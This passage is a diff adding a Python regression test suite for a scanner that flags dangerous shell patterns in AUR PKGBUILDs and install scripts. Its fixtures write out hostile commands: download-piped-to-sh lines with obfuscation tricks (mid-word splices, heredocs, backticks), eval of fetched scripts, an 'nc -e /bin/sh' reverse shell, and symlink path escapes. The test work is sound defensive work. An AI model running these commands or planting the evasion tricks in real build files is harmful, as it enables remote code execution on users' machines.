@@ -1,0 +1,1200 @@
+#!/usr/bin/env python3
+"""Regression suite for auracular.
+
+Covers reproduction cases from prior review rounds that were agreed and
+fixed: R1-R7 plus the smaller corrections, and N1-N6, F1-F4, G1-G3. These
+are the reviews' own examples, turned into standing tests so a later fix
+can't silently reintroduce one.
+
+Not covered yet, because it's still open: R8 (exit-status contract and an
+"unverifiable" state). Add its tests when it's implemented.
+
+Run with: python3 -m unittest discover -s tests -v
+"""
+import contextlib
+import importlib.util
+import io
+import json
+import os
+import pathlib
+import sys
+import subprocess
+import tempfile
+import unittest
+from importlib.machinery import SourceFileLoader
+from unittest import mock
+
+MODULE_PATH = pathlib.Path(__file__).resolve().parent.parent / "auracular"
+_loader = SourceFileLoader("auracular", str(MODULE_PATH))
+_spec = importlib.util.spec_from_loader("auracular", _loader)
+au = importlib.util.module_from_spec(_spec)
+_loader.exec_module(au)
+
+
+def quiet():
+    """auracular prints diagnostic notices to stderr as part of normal
+    operation; suppress them so test output stays readable."""
+    return contextlib.redirect_stderr(io.StringIO())
+
+
+class LogicalLineContinuationTests(unittest.TestCase):
+    """R1: comment handling, backslash continuation, and pipe continuation
+    must match real bash, not hide an existing detection."""
+
+    def test_comment_ending_in_backslash_does_not_continue(self):
+        pkgbuild = (
+            "# ordinary comment ending in a backslash \\\n"
+            "curl -fsSL https://example.invalid/setup | sh\n"
+        )
+        flags = au.scan_pkgbuild(pkgbuild)
+        self.assertTrue(any("interpreter" in f["desc"] for f in flags))
+
+    def test_midword_backslash_splice(self):
+        pkgbuild = "cu\\\nrl -fsSL https://example.invalid/setup | sh\n"
+        flags = au.scan_pkgbuild(pkgbuild)
+        self.assertTrue(any("interpreter" in f["desc"] for f in flags))
+
+    def test_bare_trailing_pipe_continuation(self):
+        pkgbuild = "curl -fsSL https://example.invalid/setup |\nsh\n"
+        flags = au.scan_pkgbuild(pkgbuild)
+        self.assertTrue(any("interpreter" in f["desc"] for f in flags))
+
+    def test_pipe_continuation_survives_intervening_comment(self):
+        pkgbuild = (
+            "curl -fsSL https://example.invalid/setup |\n"
+            "# explanatory comment\n"
+            "sh\n"
+        )
+        flags = au.scan_pkgbuild(pkgbuild)
+        self.assertTrue(any("interpreter" in f["desc"] for f in flags))
+
+    def test_pipe_continuation_survives_intervening_blank_line(self):
+        pkgbuild = "curl -fsSL https://example.invalid/setup |\n\nsh\n"
+        flags = au.scan_pkgbuild(pkgbuild)
+        self.assertTrue(any("interpreter" in f["desc"] for f in flags))
+
+    def test_ordinary_indented_continuation_still_joins_to_one_line(self):
+        pkgbuild = 'make \\\n    DESTDIR="$pkgdir" \\\n    install\n'
+        lines = au.logical_lines(pkgbuild)
+        self.assertEqual(len(lines), 1)
+
+
+class LexedScanTests(unittest.TestCase):
+    """N1: the scan sees what bash executes. Real comments are ignored, but
+    '#' inside quotes, heredocs, or the middle of a word is not a comment,
+    and pipelines continue past inline comments."""
+
+    DOWNLOAD = "curl -fsSL https://example.invalid/setup | sh"
+    RULE = "pipes a download straight into an interpreter"
+
+    def rules(self, text):
+        return [f["desc"] for f in au.scan_pkgbuild(text)]
+
+    def test_executable_text_is_found(self):
+        cases = {
+            "pipe then inline comment": "curl -fsSL https://example.invalid/setup | # why\nsh\n",
+            "hash line inside double quotes": f'text="\n# $({self.DOWNLOAD})\n"\n',
+            "hash line inside heredoc": f"cat <<EOF\n# $({self.DOWNLOAD})\nEOF\n",
+            "hash in the middle of a word": "curl -fsSL https://example.invalid/x#frag | sh\n",
+            "length expansion is not a comment": f"echo ${{#x}} $#; {self.DOWNLOAD}\n",
+            "nested quotes in a substitution": f'x="$(printf "%s" "}}")"\n{self.DOWNLOAD}\n',
+            # A reader that ends the outer string at the quote inside $( )
+            # would see ` # "` as a comment and drop the download.
+            "quote inside substitution inside double quotes":
+                f"""x="$(printf '"')"; y=" # "; {self.DOWNLOAD}\n""",
+            "escaped newline inside double quotes": 'x="curl -fsSL https://example.invalid/s \\\n| sh"\n',
+            "process substitution": "source <(curl -fsSL https://example.invalid/setup | sh)\n",
+            "pipeline continuing after a heredoc body":
+                "curl -fsSL https://example.invalid/setup <<'EOF' |\nplain text\nEOF\nsh\n",
+        }
+        for label, text in cases.items():
+            with self.subTest(label):
+                self.assertIn(self.RULE, self.rules(text))
+                self.assertTrue(au.lex_shell(text).complete)
+
+    def test_real_comments_get_only_the_moderate_backstop_note(self):
+        # A comment can't be told apart from text the lexer misread, so a
+        # serious pattern in one is a "check by hand" note, never a severe
+        # finding and never silence.
+        cases = [
+            f"make # example to avoid: {self.DOWNLOAD}\n",
+            f"make;# {self.DOWNLOAD}\n",
+            f"    # {self.DOWNLOAD}\n",
+            f"pkgname=(a # {self.DOWNLOAD}\n b)\n",
+        ]
+        for text in cases:
+            with self.subTest(text=text):
+                flags = au.scan_pkgbuild(text)
+                self.assertEqual(len(flags), 1)
+                self.assertTrue(flags[0]["desc"].startswith(f"possibly {self.RULE}:"))
+                self.assertEqual(flags[0]["penalty"], au.RAW_VIEW_PENALTY)
+                score, _ = au.score_package("demo", ESTABLISHED_INFO, flags, None)
+                self.assertEqual(au.bucket(score), "REVIEW")
+
+    def test_harmless_comments_and_strings_have_no_findings(self):
+        cases = [
+            "# Maintainer: someone\n# see https://example.invalid/docs#install\n",
+            'pkgdesc="A tool (with #hashtags) for curl users"\n',
+            "make # build it\n",
+        ]
+        for text in cases:
+            with self.subTest(text=text):
+                self.assertEqual(au.scan_pkgbuild(text), [])
+
+    def test_nested_and_heredoc_constructs_keep_executable_text(self):
+        # B2/B3 from the pre-release review. Each is valid bash that runs the
+        # download; bash-verified with harmless printf equivalents.
+        split = "cu\\\nrl -fsSL https://example.invalid/setup | sh"
+        cases = {
+            "backticks": f"x=`{split}`\n",
+            "escaped backtick contents": "x=`curl -fsSL https://example.invalid/\\$x | sh`\n",
+            "parameter default": f"x=${{y:-$({split})}}\n",
+            "case pattern inside substitution":
+                f"""x="$(case x in x) printf '" # ';; esac)"; {self.DOWNLOAD}\n""",
+            "case with leading paren and several clauses":
+                f"""x=$(case x in (a|b) echo ')';; x) echo "#";; esac); {self.DOWNLOAD}\n""",
+            "expanding heredoc": f"cat <<EOF\n# $({split})\nEOF\n",
+            "heredoc fed to a shell": "sh <<'EOF'\ncurl -fsSL https://example.invalid/setup |\nsh\nEOF\n",
+            "tab-stripped heredoc fed to a shell":
+                "bash <<-'EOF'\n\tcurl -fsSL https://example.invalid/setup |\n\tsh\n\tEOF\n",
+            # These two need real lexing of the nested text; neither the raw
+            # lines nor the plain-text backstop can join them.
+            "inline comment in a pipeline inside backticks":
+                "x=`curl -fsSL https://example.invalid/setup | # why\nsh`\n",
+            "backslash continuation in a heredoc fed to a shell":
+                "sh <<'EOF'\ncurl -fsSL https://example.invalid/setup \\\n| sh\nEOF\n",
+            # Only expanding the heredoc as the outer shell does finds this:
+            # the body line starts with '#', but its $( ) still runs.
+            "commented pipeline inside a substitution in an expanding heredoc":
+                "cat <<EOF\n# $(curl -fsSL https://example.invalid/setup | # why\nsh)\nEOF\n",
+        }
+        for label, text in cases.items():
+            with self.subTest(label):
+                self.assertIn(self.RULE, self.rules(text))
+                self.assertTrue(au.lex_shell(text).complete)
+
+    def test_code_after_a_case_statement_is_code(self):
+        text = f"case $x in\n  a) echo ')' ;;\n  *) echo '#' ;;\nesac\n{self.DOWNLOAD}\n"
+        self.assertIn(self.RULE, self.rules(text))
+
+    def test_empty_quoted_heredoc_delimiter_is_valid(self):
+        text = "cat <<''\nhello\n\nprintf done\n"
+        self.assertTrue(au.lex_shell(text).complete)
+        self.assertEqual(au.scan_pkgbuild(text), [])
+
+    def test_backstop_does_not_depend_on_the_lexer(self):
+        with mock.patch.object(au, "logical_lines", return_value=[]):
+            flags = au.scan_pkgbuild(f"x=1\n{self.DOWNLOAD}\n")
+        self.assertEqual([f["line_no"] for f in flags], [2])
+        self.assertTrue(flags[0]["desc"].startswith(f"possibly {self.RULE}:"))
+
+    def test_backstop_skips_lower_severity_rules(self):
+        flags = au.scan_pkgbuild("# old mirror: http://192.0.2.1/x\n# eval is avoided here\n")
+        self.assertEqual(flags, [])
+
+    def test_finding_reports_the_physical_line(self):
+        flags = au.scan_pkgbuild(f'pkgname=demo\ntext="\nharmless\n$({self.DOWNLOAD})\n"\n')
+        self.assertEqual([f["line_no"] for f in flags if f["desc"] == self.RULE], [4])
+
+    def test_unterminated_input_is_reported(self):
+        for text in ('x="never closed\n', "x=$(never closed\n", "cat <<EOF\nno delimiter\n"):
+            with self.subTest(text=text):
+                self.assertTrue(any("couldn't be fully parsed" in d for d in self.rules(text)))
+
+    def test_complete_input_is_not_reported_as_unparsed(self):
+        text = "pkgname=demo\ncat <<-'EOF'\n\tbody\n\tEOF\nx=\"$(echo ')')\"\n"
+        self.assertFalse(any("couldn't be fully parsed" in d for d in self.rules(text)))
+
+
+class FunctionExtractionTests(unittest.TestCase):
+    """N4: function bodies end at the real closing brace, and an ending that
+    can't be found is reported instead of silently truncated."""
+
+    def test_literal_braces_do_not_end_the_function(self):
+        bodies = {
+            "escaped": "  printf \\}\n",
+            "heredoc": "cat <<'EOF'\n}\nEOF\n",
+            "argument": "  echo }\n",
+            "quoted": "  printf '}'\n",
+            "substitution": "  x=$(printf '%s' })\n",
+            "parameter": "  x=${y:-\\}}\n",
+            "comment": "  # }\n",
+        }
+        for label, body in bodies.items():
+            with self.subTest(label):
+                text = f"package() {{\n{body}  echo tail_marker\n}}\nbuild() {{ :; }}\n"
+                extracted, complete = au.extract_function(text, "package")
+                self.assertTrue(complete)
+                self.assertIn("tail_marker", extracted)
+                self.assertNotIn("build", extracted)
+
+    def test_nested_groups_are_balanced(self):
+        text = "package() {\n  if true; then { echo a; }; fi\n  x=$( { echo b; } )\n  echo tail\n}\n"
+        body, complete = au.extract_function(text, "package")
+        self.assertTrue(complete)
+        self.assertTrue(body.rstrip().endswith("echo tail"))
+
+    def test_coproc_and_case_groups_are_balanced(self):
+        # B4: bash keeps the tail of each of these (checked with declare -f).
+        bodies = {
+            "anonymous coproc": "  coproc { printf worker; }\n",
+            "named coproc": "  coproc worker { printf worker; }\n",
+            "simple coproc": "  coproc cat\n",
+            "group inside case": "  case $x in\n    a) { echo a; } ;;\n    b) echo '}' ;;\n  esac\n",
+        }
+        for label, body in bodies.items():
+            with self.subTest(label):
+                text = f"package() {{\n{body}  echo tail_marker\n}}\nbuild() {{ :; }}\n"
+                extracted, complete = au.extract_function(text, "package")
+                self.assertTrue(complete)
+                self.assertEqual(extracted, f"\n{body}  echo tail_marker\n")
+
+    def test_function_keyword_form(self):
+        for header in ("function package {", "function package() {", "package ()\n{"):
+            with self.subTest(header=header):
+                body, complete = au.extract_function(f"{header}\n  echo inside\n}}\n", "package")
+                self.assertIn("echo inside", body)
+                self.assertTrue(complete)
+
+    def test_quoted_or_commented_definitions_are_not_matched(self):
+        text = ('echo "package() { fake; }"\n# package() { commented; }\n'
+                "package() {\n  echo real\n}\n")
+        body, _ = au.extract_function(text, "package")
+        self.assertIn("real", body)
+        self.assertNotIn("fake", body)
+
+    def test_unclosed_function_is_reported_incomplete(self):
+        body, complete = au.extract_function("package() {\n  echo a\n  echo b\n", "package")
+        self.assertFalse(complete)
+        self.assertIn("echo b", body)
+
+    def test_explain_warns_about_incomplete_function_and_covers_verify_pkgver(self):
+        text = ("pkgname=demo\nverify() { :; }\npkgver() { echo 1; }\n"
+                "package() {\n  echo a\n")
+        info = {"Description": "x", "Version": "1", "Maintainer": "m", "URL": "u",
+                "NumVotes": 0, "Popularity": 0.0}
+        out = io.StringIO()
+        with contextlib.redirect_stdout(out):
+            au.print_explain_report("demo", info, text)
+        report = out.getvalue()
+        self.assertIn("verify() {", report)
+        self.assertIn("pkgver() {", report)
+        self.assertIn("couldn't find where this function ends", report)
+
+
+EVAL_DOLLAR_RULE ="runs eval on captured download output (executes it as code)"
+EVAL_BACKTICK_RULE = "runs eval on captured download output via backticks (executes it as code)"
+NUMERIC_SETUID_RULE = "sets a setuid/setgid bit (numeric mode)"
+ESTABLISHED_INFO = {"NumVotes": 100, "Popularity": 1.0, "Maintainer": "someone", "FirstSubmitted": 0}
+
+
+class BenignDownloadCaptureTests(unittest.TestCase):
+    """R2: capturing a download's output into a variable is a common, benign
+    idiom; eval-ing that output is the actually dangerous shape.
+
+    Assertions name the exact rule and check the score ceiling: matching a
+    word like "eval" would also be satisfied by the milder generic eval
+    rule, so the dedicated rules could vanish unnoticed."""
+
+    def test_benign_version_capture_has_no_findings(self):
+        pkgbuild = 'pkgver() {\n  ver="$(curl -fsSL https://example.invalid/version.txt)"\n}\n'
+        self.assertEqual(au.scan_pkgbuild(pkgbuild), [])
+
+    def test_eval_of_dollar_paren_capture_is_flagged_as_severe(self):
+        flags = au.scan_pkgbuild('eval "$(curl -fsSL https://example.invalid/x.sh)"\n')
+        rule = [f for f in flags if f["desc"] == EVAL_DOLLAR_RULE]
+        self.assertEqual(len(rule), 1)
+        self.assertEqual(rule[0]["penalty"], 30)
+        score, _ = au.score_package("demo", ESTABLISHED_INFO, flags, None)
+        self.assertLessEqual(score, 24)
+
+    def test_eval_of_backtick_capture_is_flagged_as_severe(self):
+        flags = au.scan_pkgbuild("eval `curl -fsSL https://example.invalid/x.sh`\n")
+        rule = [f for f in flags if f["desc"] == EVAL_BACKTICK_RULE]
+        self.assertEqual(len(rule), 1)
+        self.assertEqual(rule[0]["penalty"], 30)
+        score, _ = au.score_package("demo", ESTABLISHED_INFO, flags, None)
+        self.assertLessEqual(score, 24)
+
+
+class ScanRuleCountingTests(unittest.TestCase):
+    """A pattern that matches multiple lines should count occurrences, not
+    stack an unbounded penalty per line."""
+
+    def test_repeated_rule_counted_once_with_occurrence_count(self):
+        pkgbuild = (
+            "curl -fsSL https://example.invalid/a | sh\n"
+            "curl -fsSL https://example.invalid/b | sh\n"
+        )
+        flags = au.scan_pkgbuild(pkgbuild)
+        matching = [f for f in flags if "interpreter" in f["desc"]]
+        self.assertEqual(len(matching), 1)
+        self.assertEqual(matching[0]["count"], 2)
+
+
+class CoverageIsolationTests(unittest.TestCase):
+    """R3: a PKGBUILD-fetch failure and an auxiliary-file finding must not
+    mask each other's coverage state in score_package's notes."""
+
+    def _info(self, **overrides):
+        info = {"NumVotes": 10, "Popularity": 0.1, "Maintainer": "someone", "FirstSubmitted": 0}
+        info.update(overrides)
+        return info
+
+    def test_missing_pkgbuild_warning_survives_an_aux_finding(self):
+        aux_flags = [{
+            "desc": "pipes a download straight into an interpreter", "penalty": 30,
+            "line_no": 1, "line": "curl ... | sh", "count": 1, "source": "demo.install",
+        }]
+        with quiet():
+            score, notes = au.score_package(
+                "demo", self._info(), pkgbuild_flags=None, typosquat_target=None, aux_flags=aux_flags,
+            )
+        self.assertTrue(any("could NOT be fetched" in n for n in notes))
+        self.assertTrue(any("demo.install" in n for n in notes))
+
+
+class ScoreCeilingTests(unittest.TestCase):
+    """Score ceilings on severe findings must hold regardless of votes/age -
+    popularity is not a mitigation for an actual code-execution finding."""
+
+    def _info(self, **overrides):
+        info = {"NumVotes": 1000, "Popularity": 5.0, "Maintainer": "someone", "FirstSubmitted": 0}
+        info.update(overrides)
+        return info
+
+    def test_unscanned_pkgbuild_capped_at_60(self):
+        with quiet():
+            score, _ = au.score_package("demo", self._info(), pkgbuild_flags=None, typosquat_target=None)
+        self.assertLessEqual(score, 60)
+
+    def test_severe_finding_caps_score_at_24(self):
+        flags = [{"desc": "opens a reverse shell", "penalty": 40, "line_no": 1,
+                  "line": "nc -e /bin/sh 1.2.3.4 4444", "count": 1, "source": "PKGBUILD"}]
+        with quiet():
+            score, _ = au.score_package("demo", self._info(), pkgbuild_flags=flags, typosquat_target=None)
+        self.assertLessEqual(score, 24)
+
+    def test_package_not_found_on_aur_scores_zero(self):
+        score, notes = au.score_package("ghost", None, None, None)
+        self.assertEqual(score, 0)
+
+
+class PkgbuildContentValidationTests(unittest.TestCase):
+    """R4: a successful HTTP response carrying an HTML challenge/error page
+    is not shell code and must not be treated as a scanned PKGBUILD."""
+
+    def test_html_challenge_page_rejected(self):
+        html = "<!doctype html><title>Checking your browser</title>"
+        self.assertFalse(au.looks_like_pkgbuild(html))
+
+    def test_real_pkgbuild_accepted(self):
+        text = "pkgname=demo\npkgver=1.0\n"
+        self.assertTrue(au.looks_like_pkgbuild(text))
+
+    def test_empty_text_rejected(self):
+        self.assertFalse(au.looks_like_pkgbuild(""))
+
+
+class AurRpcResponseTests(unittest.TestCase):
+    """R4 + its follow-up: malformed or error-shaped RPC bodies must be
+    treated as a failed lookup (None) - never as an empty successful one -
+    and must never raise."""
+
+    def test_rpc_error_type_returns_none(self):
+        with mock.patch.object(au, "http_get", return_value='{"type": "error", "results": []}'), quiet():
+            self.assertIsNone(au.fetch_aur_info(["demo"]))
+
+    def test_rpc_null_body_returns_none(self):
+        with mock.patch.object(au, "http_get", return_value="null"), quiet():
+            self.assertIsNone(au.fetch_aur_info(["demo"]))
+
+    def test_rpc_results_null_returns_none(self):
+        body = '{"type": "multiinfo", "results": null}'
+        with mock.patch.object(au, "http_get", return_value=body), quiet():
+            self.assertIsNone(au.fetch_aur_info(["demo"]))
+
+    def test_rpc_results_wrong_type_returns_none(self):
+        body = '{"type": "multiinfo", "results": 1}'
+        with mock.patch.object(au, "http_get", return_value=body), quiet():
+            self.assertIsNone(au.fetch_aur_info(["demo"]))
+
+    def test_rpc_success_returns_dict_keyed_by_name(self):
+        body = '{"type": "multiinfo", "results": [{"Name": "demo", "Version": "1.0"}]}'
+        with mock.patch.object(au, "http_get", return_value=body), quiet():
+            result = au.fetch_aur_info(["demo"])
+        self.assertEqual(result["demo"]["Version"], "1.0")
+
+
+class GitRepoTestCase(unittest.TestCase):
+    """A throwaway local git repo standing in for an AUR package repo,
+    cloned through a file:// URL so no network is involved."""
+
+    def setUp(self):
+        self.tmp = tempfile.TemporaryDirectory()
+        self.addCleanup(self.tmp.cleanup)
+        self.repo_dir = pathlib.Path(self.tmp.name) / "repo"
+        self.repo_dir.mkdir()
+        self.outside_marker = pathlib.Path(self.tmp.name) / "outside-secret.txt"
+        self.outside_marker.write_text("outside contents\n")
+        self._git("init", "-q", "-b", "master")
+        self._git("config", "user.email", "test@example.invalid")
+        self._git("config", "user.name", "Test")
+        self._git("config", "commit.gpgSign", "false")
+        self._git("config", "core.hooksPath", "/dev/null")
+
+    def _git(self, *args, env=None):
+        subprocess.run(["git", "-C", str(self.repo_dir), *args], check=True,
+                        capture_output=True, text=True, env=env)
+
+    def _commit_all(self, author=None, timestamp=None):
+        env = None
+        if timestamp is not None:
+            env = dict(os.environ, GIT_AUTHOR_DATE=f"@{timestamp} +0000",
+                       GIT_COMMITTER_DATE=f"@{timestamp} +0000")
+        self._git("add", "-A")
+        extra = ["--author", author] if author else []
+        self._git("commit", "-q", "--allow-empty", "-m", "test commit", *extra, env=env)
+
+    def _clone_and_scan(self, extra_files=()):
+        # Clone next to outside_marker, so a "../outside-secret.txt" escape
+        # would find a real file instead of passing because nothing's there.
+        clone_dir = pathlib.Path(self.tmp.name) / "clone"
+        clone_dir.mkdir()
+        with mock.patch.object(au, "AUR_GIT_URL", self.repo_dir.as_uri()), \
+                mock.patch.object(au.tempfile, "mkdtemp", return_value=str(clone_dir)):
+            return au.fetch_commit_history("ignored", extra_files=extra_files)
+
+
+class AuxFileContainmentTests(GitRepoTestCase):
+    """R5: auxiliary-file collection must not follow symlinks outside the
+    clone, must cap file size, and must key by relative path so same-named
+    files in different subdirectories don't collide into one entry."""
+
+    def test_symlink_outside_clone_is_not_read(self):
+        (self.repo_dir / "pwn.install").symlink_to(self.outside_marker)
+        self._commit_all()
+        commits, aux_files = self._clone_and_scan()
+        self.assertIsNotNone(commits, "git clone unexpectedly failed")
+        self.assertNotIn("outside contents", "".join(aux_files.values()))
+
+    def test_oversized_file_is_skipped(self):
+        (self.repo_dir / "big.install").write_bytes(b"a" * 1_100_000)
+        self._commit_all()
+        commits, aux_files = self._clone_and_scan()
+        self.assertIsNotNone(commits, "git clone unexpectedly failed")
+        self.assertNotIn("big.install", aux_files)
+
+    def test_same_filename_in_different_subdirs_both_kept(self):
+        (self.repo_dir / "sub1").mkdir()
+        (self.repo_dir / "sub2").mkdir()
+        (self.repo_dir / "sub1" / "shared.install").write_text("one\n")
+        (self.repo_dir / "sub2" / "shared.install").write_text("two\n")
+        self._commit_all()
+        commits, aux_files = self._clone_and_scan()
+        self.assertIsNotNone(commits, "git clone unexpectedly failed")
+        self.assertIn(str(pathlib.Path("sub1") / "shared.install"), aux_files)
+        self.assertIn(str(pathlib.Path("sub2") / "shared.install"), aux_files)
+
+    def test_declared_file_outside_clone_is_not_read(self):
+        self._commit_all()
+        for target in ("../outside-secret.txt", str(self.outside_marker)):
+            with self.subTest(target=target):
+                commits, aux_files = self._clone_and_scan(extra_files=[target])
+                self.assertIsNotNone(aux_files, "git clone unexpectedly failed")
+                self.assertNotIn("outside contents", "".join(aux_files.values()))
+
+    def test_file_under_symlinked_directory_is_not_read(self):
+        outside_dir = pathlib.Path(self.tmp.name) / "outside-dir"
+        outside_dir.mkdir()
+        (outside_dir / "secret.install").write_text("outside contents\n")
+        (self.repo_dir / "linkdir").symlink_to(outside_dir)
+        self._commit_all()
+        commits, aux_files = self._clone_and_scan(extra_files=["linkdir/secret.install"])
+        self.assertIsNotNone(aux_files, "git clone unexpectedly failed")
+        self.assertNotIn("outside contents", "".join(aux_files.values()))
+
+    def test_symlink_inside_clone_is_also_refused(self):
+        (self.repo_dir / "real.txt").write_text("inside contents\n")
+        (self.repo_dir / "alias.install").symlink_to("real.txt")
+        self._commit_all()
+        commits, aux_files = self._clone_and_scan()
+        self.assertIsNotNone(aux_files, "git clone unexpectedly failed")
+        self.assertNotIn("alias.install", aux_files)
+
+    def test_failed_clone_reports_aux_files_as_unread(self):
+        with mock.patch.object(au, "AUR_GIT_URL", (self.repo_dir / "missing").as_uri()):
+            commits, aux_files = au.fetch_commit_history("ignored")
+        self.assertIsNone(commits)
+        self.assertIsNone(aux_files)
+
+
+DOWNLOAD = "curl -fsSL https://example.invalid/setup | sh"
+INTERPRETER_RULE = "pipes a download straight into an interpreter"
+
+
+class InstallTargetTests(unittest.TestCase):
+    """N2, F1, F2: install scripts are found from what the PKGBUILD declares
+    (not an optional .install suffix), with bash quoting respected, and any
+    install-setting line that isn't fully understood is counted as
+    unaccounted rather than silently ignored."""
+
+    def targets(self, text, name="demo", base="demo"):
+        return au.install_targets(text, name, base)
+
+    def test_global_install_without_suffix(self):
+        self.assertEqual(self.targets("pkgname=demo\ninstall=post-install\n"),
+                         ([("post-install", ["post-install"])], 0))
+
+    def test_indented_declaration_is_found(self):
+        self.assertEqual(self.targets("pkgname=demo\n  install=post-install\n"),
+                         ([("post-install", ["post-install"])], 0))
+
+    def test_split_package_declarations_all_found(self):
+        text = ("pkgname=(demo demo-docs)\npackage_demo() {\n  install=post-install\n  :\n}\n"
+                "package_demo-docs() {\n  install=docs.install\n}\n")
+        self.assertEqual(self.targets(text, base="bundle"),
+                         ([("post-install", ["post-install"]), ("docs.install", ["docs.install"])], 0))
+
+    def test_declaration_after_escaped_or_heredoc_brace_is_found(self):
+        for body in ("  printf \\}\n", "cat <<'EOF'\n}\nEOF\n"):
+            with self.subTest(body=body):
+                text = f"pkgname=(demo)\npackage_demo() {{\n{body}  install=post-install\n}}\n"
+                self.assertEqual(self.targets(text), ([("post-install", ["post-install"])], 0))
+
+    def test_single_quoted_variable_is_literal(self):
+        self.assertEqual(self.targets("pkgname=demo\ninstall='$pkgname'\n"),
+                         ([("'$pkgname'", ["$pkgname"])], 0))
+
+    def test_escaped_dollar_is_literal(self):
+        self.assertEqual(self.targets('pkgname=demo\ninstall="\\$pkgname"\n'),
+                         ([('"\\$pkgname"', ["$pkgname"])], 0))
+
+    def test_double_quoted_variable_is_expanded(self):
+        self.assertEqual(self.targets('pkgname=demo\ninstall="$pkgname.install"\n'),
+                         ([('"$pkgname.install"', ["demo.install"])], 0))
+
+    def test_pkgbase_defaults_to_first_pkgname_plus_aur_base(self):
+        text = "pkgname=(demo demo-docs)\ninstall=${pkgbase}-extra\n"
+        self.assertEqual(self.targets(text, base="bundle"),
+                         ([("${pkgbase}-extra", ["bundle-extra", "demo-extra"])], 0))
+
+    def test_split_pkgname_expands_to_every_package(self):
+        text = "pkgname=(demo demo-docs)\ninstall=$pkgname.install\n"
+        self.assertEqual(self.targets(text, base="bundle"),
+                         ([("$pkgname.install", ["demo-docs.install", "demo.install"])], 0))
+
+    def test_single_literal_helper_variable_is_resolved(self):
+        text = "pkgname=demo-git\n_name=demo\ninstall=${_name}.install\n"
+        self.assertEqual(self.targets(text, name="demo-git"),
+                         ([("${_name}.install", ["demo.install"])], 0))
+
+    def test_one_level_of_nesting_and_literal_trimming(self):
+        cases = {
+            # _n must be set first: bash expands the right-hand side when
+            # the assignment runs, so the reverse order really does give
+            # pkgname=_arch. See the order/scope tests below.
+            "_n=discord\npkgname=${_n}_arch\ninstall=\"$pkgname.install\"\n":
+                ("discord_arch", ["discord_arch.install"]),
+            "pkgname=ventoy-bin\ninstall=\"${pkgname%-bin}.install\"\n": ("ventoy-bin", ["ventoy.install"]),
+            "pkgname=python-demo\ninstall=${pkgname##python-}.install\n": ("python-demo", ["demo.install"]),
+        }
+        for text, (name, expected) in cases.items():
+            with self.subTest(text=text):
+                declarations, unaccounted = self.targets(text, name=name, base=name)
+                self.assertEqual([c for _, c in declarations], [expected])
+                self.assertEqual(unaccounted, 0)
+
+    def test_unresolvable_pkgname_never_falls_back_to_the_aur_name(self):
+        # The AUR's name comes from maintainer-written .SRCINFO; if the
+        # PKGBUILD's own pkgname can't be worked out, $pkgname stays unknown.
+        cases = [
+            "_a=${_b}\n_b=x\npkgname=${_a}-git\ninstall=$pkgname.install\n",
+            "pkgname=$(printf demo)\ninstall=$pkgname.install\n",
+            "pkgname=${_n}\ninstall=$pkgname.install\n",
+        ]
+        for text in cases:
+            with self.subTest(text=text):
+                self.assertEqual(self.targets(text), ([("$pkgname.install", None)], 0))
+
+    # --- B6: an assignment only counts where it is established to apply ---
+    # The resolver used to credit an assignment that never runs, or runs too
+    # late, and so read a clean decoy script while the real install script
+    # went unscanned. The order and uncalled-function cases below match real
+    # bash; where the answer depends on whether some other function ran, the
+    # expectation is deliberate caution instead, since unresolved prints a
+    # coverage warning and keeps the package out of LOW RISK.
+
+    def test_later_assignment_does_not_feed_an_earlier_nested_reference(self):
+        # bash: _prefix is unset here, so _hook becomes "post-install".
+        # Crediting the later decoy- would send the scanner to the wrong file.
+        text = ("pkgname=demo\n_hook=${_prefix}post-install\n"
+                "_prefix=decoy-\ninstall=$_hook\n")
+        self.assertEqual(self.targets(text), ([("$_hook", None)], 0))
+
+    def test_forward_reference_to_a_later_assignment_is_unresolved(self):
+        text = "pkgname=demo\ninstall=${_prefix}post-install\n_prefix=decoy-\n"
+        self.assertEqual(self.targets(text), ([("${_prefix}post-install", None)], 0))
+
+    def test_assignment_inside_an_uncalled_function_is_unresolved(self):
+        # Line order alone would accept this one, which is why scope is
+        # checked separately: unused() never runs, so _prefix is never set.
+        text = ("pkgname=demo\nunused() {\n  _prefix=decoy-\n}\n"
+                "install=${_prefix}post-install\n")
+        self.assertEqual(self.targets(text), ([("${_prefix}post-install", None)], 0))
+
+    def test_declaration_sharing_a_line_with_a_function_is_not_resolved(self):
+        # Sharing a physical line with the braces makes this one lexed
+        # statement, which is not a declaration install_targets understands,
+        # so the unaccounted backstop reports it rather than the resolver
+        # quietly picking up the decoy below. (The resolver's own containment
+        # rules are deliberately cautious about such lines too; with the
+        # current lexer nothing parseable can reach them.)
+        text = "pkgname=demo\npackage() { :; }; install=${_prefix}hook\n_prefix=decoy-\n"
+        self.assertEqual(self.targets(text), ([], 1))
+
+    def test_header_assignment_reaches_a_reference_inside_a_function(self):
+        # The counterpart the fix must not break: a split package sets
+        # install= in its package function using a header variable. Nothing
+        # in the header can call a function, so the header has finished
+        # before any invocation.
+        text = ("pkgname=demo\n_hook=real.install\npackage_demo() {\n"
+                "  install=$_hook\n}\n")
+        self.assertEqual(self.targets(text), ([("$_hook", ["real.install"])], 0))
+
+    def test_assignment_after_the_function_definition_is_unresolved(self):
+        # Reading the file does not establish when package_demo() runs. It
+        # could be called while the PKGBUILD is still being sourced, before
+        # this line, so the value is not settled.
+        text = ("pkgname=demo\npackage_demo() {\n  install=$_hook\n}\n"
+                "_hook=real.install\n")
+        self.assertEqual(self.targets(text), ([("$_hook", None)], 0))
+
+    def test_assignment_inside_a_function_is_unresolved(self):
+        # Even in the same body, before the reference: only header
+        # assignments are credited, because a function body can be entered
+        # conditionally, repeatedly, or not at all.
+        text = ("pkgname=demo\npackage_demo() {\n  _hook=real.install\n"
+                "  install=$_hook\n}\n")
+        self.assertEqual(self.targets(text), ([("$_hook", None)], 0))
+
+    def test_setter_in_an_untaken_branch_is_unresolved(self):
+        text = ("pkgname=demo\nif false; then\n  _prefix=decoy-\nfi\n"
+                "install=${_prefix}post-install\n")
+        self.assertEqual(self.targets(text), ([("${_prefix}post-install", None)], 0))
+
+    def test_setter_in_a_subshell_is_unresolved(self):
+        # A subshell's assignments never reach the parent shell at all.
+        text = ("pkgname=demo\n(\n  _prefix=decoy-\n)\n"
+                "install=${_prefix}post-install\n")
+        self.assertEqual(self.targets(text), ([("${_prefix}post-install", None)], 0))
+
+    def test_function_called_while_sourcing_does_not_see_a_later_setter(self):
+        text = ("pkgname=demo\nchoose() {\n  install=${_prefix}post-install\n}\n"
+                "choose\n_prefix=decoy-\n")
+        self.assertEqual(self.targets(text), ([("${_prefix}post-install", None)], 0))
+
+    def test_a_second_possible_writer_anywhere_leaves_the_value_unsettled(self):
